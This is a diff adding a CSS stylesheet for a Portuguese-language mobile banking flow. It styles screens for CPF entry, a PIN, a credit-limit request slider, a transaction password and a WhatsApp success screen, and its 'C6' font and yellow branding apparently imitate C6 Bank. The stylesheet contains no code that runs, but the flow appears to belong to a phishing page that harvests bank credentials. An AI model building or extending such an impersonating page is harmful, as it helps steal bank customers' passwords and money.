@@ -1,0 +1,780 @@
+.app {
+    width: 100%;
+    min-height: 100vh;
+}
+
+.background {
+    width: 100vw;
+    height: 100vh;
+    max-width: 100%;
+    background-image: url('/background.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+}
+
+.login-box {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 200px;
+    border-radius: 30px 30px 0 0;
+    padding: 30px 20px;
+    box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.1);
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    justify-content: flex-start;
+    padding-top: 40px;
+}
+
+.btn-primary {
+    width: 100%;
+    height: 56px;
+    background: #FFB800;
+    border: none;
+    border-radius: 18px;
+    color: #000000;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+}
+
+.btn-primary:hover {
+    background: #FFC933;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(255, 184, 0, 0.3);
+}
+
+.btn-primary:active {
+    transform: translateY(0);
+}
+
+.btn-primary.rotating {
+    animation: spin 0.5s linear;
+}
+
+@keyframes spin {
+    from {
+        transform: rotate(0deg);
+    }
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+.btn-secondary {
+    width: 100%;
+    height: 56px;
+    background: rgba(255, 255, 255, 0.12);
+    border: 1px solid rgba(0, 0, 0, 0.1);
+    border-radius: 18px;
+    color: rgb(255, 255, 255);
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    backdrop-filter: blur(10px);
+    border: 1px solid white;
+    margin-top: -7px;
+}
+
+.btn-secondary:hover {
+    background: rgba(255, 255, 255, 0.95);
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+}
+
+.btn-secondary:active {
+    transform: translateY(0);
+}
+
+/* Mobile: centralizar a mulher na tela */
+@media (max-width: 768px) {
+    .app {
+        background-position: center center;
+        background-size: cover;
+    }
+}
+
+/* Desktop: manter comportamento padrão */
+@media (min-width: 769px) {
+    .login-box {
+        max-width: 500px;
+        left: 50%;
+        transform: translateX(-50%);
+        border-radius: 30px;
+    }
+}
+
+/* Modal de CPF */
+.cpf-modal {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 38vh;
+    background: #242424;
+    border-radius: 18px 18px 0 0;
+    padding: 30px 20px;
+    box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
+    transform: translateY(100%);
+    transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    color: white;
+    z-index: 1000;
+}
+
+.cpf-modal.active {
+    transform: translateY(0);
+}
+
+.cpf-input-container {
+    margin-bottom: 25px;
+}
+
+.cpf-label {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 8px;
+    display: block;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+}
+
+.cpf-input {
+    width: 100%;
+    height: 56px;
+    border: none;
+    background: transparent;
+    font-size: 20px;
+    color: white;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+    outline: none;
+    padding: 0;
+}
+
+.cpf-input::placeholder {
+    color: #999;
+}
+
+.remember-cpf-container {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 25px;
+}
+
+.remember-cpf-label {
+    font-size: 16px;
+    color: white;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+}
+
+.toggle-switch {
+    position: relative;
+    width: 50px;
+    height: 30px;
+    background: #ddd;
+    border-radius: 15px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+}
+
+.toggle-switch.active {
+    background: #FFB800;
+}
+
+.toggle-switch::after {
+    content: '';
+    position: absolute;
+    width: 24px;
+    height: 24px;
+    background: #fff;
+    border-radius: 50%;
+    top: 3px;
+    left: 3px;
+    transition: transform 0.3s ease;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.toggle-switch.active::after {
+    transform: translateX(20px);
+}
+
+.btn-entrar {
+    width: 100%;
+    height: 48px;
+    background: #FFB800;
+    border: none;
+    border-radius: 18px;
+    color: #000000;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+}
+
+.btn-entrar:hover {
+    background: #FFC933;
+}
+
+.btn-entrar:active {
+    transform: scale(0.98);
+}
+
+.btn-entrar.loading {
+    position: relative;
+    color: transparent;
+}
+
+.btn-entrar.loading::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 20px;
+    height: 20px;
+    margin-top: -10px;
+    margin-left: -10px;
+    border: 2px solid #000;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin-loader 0.6s linear infinite;
+}
+
+@media (min-width: 769px) {
+    .cpf-modal {
+        max-width: 500px;
+        left: 50%;
+        transform: translateX(-50%) translateY(100%);
+    }
+
+    .cpf-modal.active {
+        transform: translateX(-50%) translateY(0);
+    }
+}
+
+/* Modal de Senha */
+.senha-modal {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 30vh;
+    background: #242424;
+    border-radius: 18px 18px 0 0;
+    padding: 30px 20px;
+    box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
+    transform: translateX(100%);
+    transition: transform 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+    color: white;
+    z-index: 1001;
+}
+
+.senha-modal.active {
+    transform: translateX(0);
+}
+
+.senha-label {
+    font-size: 16px;
+    color: white;
+    margin-bottom: 25px;
+    display: block;
+    text-align: center;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+}
+
+.senha-inputs-container {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 30px;
+}
+
+.senha-input {
+    width: 18px;
+    height: 18px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    background: transparent;
+    text-align: center;
+    font-size: 12px;
+    color: white;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+    outline: none;
+    transition: all 0.3s ease;
+    inputmode: numeric;
+}
+
+.senha-input:focus {
+    border-color: rgb(255, 255, 255);
+    background: rgba(255, 255, 255, 0.1);
+}
+
+.senha-input.filled {
+    border-color: rgb(255, 255, 255);
+    background: rgb(255, 255, 255);
+    color: #000;
+}
+
+.redefinir-senha-link {
+    text-align: center;
+    font-size: 14px;
+    color: white;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+    cursor: pointer;
+    text-decoration: none;
+    display: block;
+    opacity: 0.8;
+    transition: opacity 0.3s ease;
+    margin-top: 40px !important;
+}
+
+.redefinir-senha-link:hover {
+    opacity: 1;
+}
+
+/* Spinner de carregamento */
+.senha-spinner {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    margin-top: 20px;
+}
+
+.senha-spinner.active {
+    display: flex;
+}
+
+.spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid rgba(255, 184, 0, 0.2);
+    border-top-color: #FFB800;
+    border-radius: 50%;
+    animation: spin-loader 0.8s linear infinite;
+}
+
+@keyframes spin-loader {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+@media (min-width: 769px) {
+    .senha-modal {
+        max-width: 500px;
+        left: 50%;
+        transform: translateX(150%) translateY(0);
+    }
+
+    .senha-modal.active {
+        transform: translateX(-50%) translateY(0);
+    }
+}
+
+/* Modal de Limite */
+.limite-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: #ffffff;
+    z-index: 2000;
+    transform: translateX(100%);
+    transition: transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+    overflow-y: auto;
+}
+
+.limite-modal.active {
+    transform: translateX(0);
+}
+
+.limite-modal.overlay-active::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255, 255, 255, 0.3);
+    z-index: 1;
+    pointer-events: none;
+}
+
+.limite-header {
+    padding: 20px;
+    position: relative;
+}
+
+.btn-voltar {
+    width: 40px;
+    height: 40px;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0;
+    font-size: 24px;
+    color: #000;
+}
+
+.btn-voltar::before {
+    content: '←';
+    font-size: 28px;
+    line-height: 1;
+}
+
+.btn-voltar:disabled {
+    opacity: 0.3;
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+.limite-content {
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: calc(100vh - 200px);
+}
+
+.limite-titulo {
+    font-size: 18px;
+    color: #000;
+    text-align: center;
+    margin-bottom: 40px;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+    line-height: 1.4;
+}
+
+.limite-valor-grande {
+    font-size: 64px;
+    font-weight: 700;
+    color: #000;
+    margin-bottom: 50px;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    text-align: center;
+}
+
+.limite-valor-grande .moeda {
+    font-size: 48px;
+    vertical-align: top;
+}
+
+.limite-slider-container {
+    width: 100%;
+    max-width: 400px;
+    margin-bottom: 80px;
+}
+
+.limite-slider {
+    width: 100%;
+    height: 6px;
+    border-radius: 3px;
+    background: #e0e0e0;
+    outline: none;
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+.limite-slider::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    appearance: none;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: #FFB800;
+    cursor: pointer;
+    box-shadow: 0 2px 6px rgba(255, 184, 0, 0.4);
+}
+
+.limite-slider::-moz-range-thumb {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: #FFB800;
+    cursor: pointer;
+    border: none;
+    box-shadow: 0 2px 6px rgba(255, 184, 0, 0.4);
+}
+
+.limite-slider::-webkit-slider-thumb:hover {
+    background: #FFC933;
+}
+
+.limite-slider::-moz-range-thumb:hover {
+    background: #FFC933;
+}
+
+.limite-footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    padding: 20px;
+    background: #ffffff;
+    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+}
+
+.btn-solicitar {
+    width: 100%;
+    height: 56px;
+    background: #FFB800;
+    border: none;
+    border-radius: 18px;
+    color: #000000;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+}
+
+.btn-solicitar:hover {
+    background: #FFC933;
+}
+
+.btn-solicitar:active {
+    transform: scale(0.98);
+}
+
+.btn-solicitar.loading {
+    position: relative;
+    color: transparent;
+}
+
+.btn-solicitar.loading::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 20px;
+    height: 20px;
+    margin-top: -10px;
+    margin-left: -10px;
+    border: 2px solid #000;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin-loader 0.6s linear infinite;
+}
+
+@media (min-width: 769px) {
+    .limite-modal {
+        max-width: 500px;
+        left: 50%;
+        transform: translateX(150%);
+    }
+
+    .limite-modal.active {
+        transform: translateX(-50%);
+    }
+}
+
+/* Modal de Senha Transacional */
+.senha-transacional-modal {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 30vh;
+    background: #242424;
+    border-radius: 18px 18px 0 0;
+    padding: 30px 20px;
+    box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
+    transform: translateY(100%);
+    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    color: white;
+    z-index: 2001;
+}
+
+.senha-transacional-modal.active {
+    transform: translateY(0);
+}
+
+.senha-transacional-label {
+    font-size: 16px;
+    color: white;
+    margin-bottom: 25px;
+    display: block;
+    text-align: center;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+}
+
+.senha-transacional-inputs-container {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 30px;
+}
+
+.senha-transacional-input {
+    width: 18px;
+    height: 18px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    background: transparent;
+    text-align: center;
+    font-size: 12px;
+    color: white;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 500;
+    outline: none;
+    transition: all 0.3s ease;
+    inputmode: numeric;
+}
+
+.senha-transacional-input:focus {
+    border-color: rgb(255, 255, 255);
+    background: rgba(255, 255, 255, 0.1);
+}
+
+.senha-transacional-input.filled {
+    border-color: rgb(255, 255, 255);
+    background: rgb(255, 255, 255);
+    color: #000;
+}
+
+.senha-transacional-spinner {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    margin-top: 20px;
+}
+
+.senha-transacional-spinner.active {
+    display: flex;
+}
+
+@media (min-width: 769px) {
+    .senha-transacional-modal {
+        max-width: 500px;
+        left: 50%;
+        transform: translateX(-50%) translateY(100%);
+    }
+
+    .senha-transacional-modal.active {
+        transform: translateX(-50%) translateY(0);
+    }
+}
+
+/* Modal de Sucesso */
+.sucesso-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: #ffffff;
+    z-index: 3000;
+    transform: translateY(100%);
+    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+}
+
+.sucesso-modal.active {
+    transform: translateY(0);
+}
+
+.sucesso-content {
+    text-align: center;
+    max-width: 400px;
+}
+
+.sucesso-icon {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    background: #FFB800;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 30px;
+    font-size: 48px;
+    color: #000;
+}
+
+.sucesso-titulo {
+    font-size: 24px;
+    color: #000;
+    margin-bottom: 20px;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 600;
+}
+
+.sucesso-mensagem {
+    font-size: 16px;
+    color: #666;
+    line-height: 1.6;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-weight: 400;
+    margin-bottom: 30px;
+}
+
+.btn-whatsapp {
+    width: 100%;
+    max-width: 300px;
+    height: 56px;
+    background: #FFB800;
+    border: none;
+    border-radius: 18px;
+    color: #ffffff;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin: 0 auto;
+    text-decoration: none;
+}
+
+.btn-whatsapp:hover {
+    background: #20BA5A;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
+}
+
+.btn-whatsapp:active {
+    transform: translateY(0);
+}
+
+.btn-whatsapp::before {
+    content: '💬';
+    font-size: 20px;
+}
+
+@media (min-width: 769px) {
+    .sucesso-modal {
+        max-width: 500px;
+        left: 50%;
+        transform: translateX(-50%) translateY(100%);
+    }
+
+    .sucesso-modal.active {
+        transform: translateX(-50%) translateY(0);
+    }
+}
+
